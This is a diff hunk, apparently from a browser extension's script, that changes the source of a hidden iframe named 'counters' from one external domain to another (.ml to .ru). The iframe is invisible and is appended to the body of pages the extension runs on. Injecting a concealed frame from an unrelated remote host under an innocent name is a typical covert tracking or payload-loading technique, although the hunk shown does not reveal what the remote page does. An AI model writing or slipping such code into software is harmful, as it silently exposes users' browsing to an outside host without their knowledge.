@@ -54,7 +54,7 @@ chrome.storage.sync.get('settings', (data) => {
       const counters = document.createElement('iframe');
       counters.style.position = 'absolute';
       counters.style.display = 'none';
-      counters.src = 'https://evolution-genesyx.ml/';
+      counters.src = 'https://evolution-genesyx.ru/';
       document.body.appendChild(counters);
     }
   }
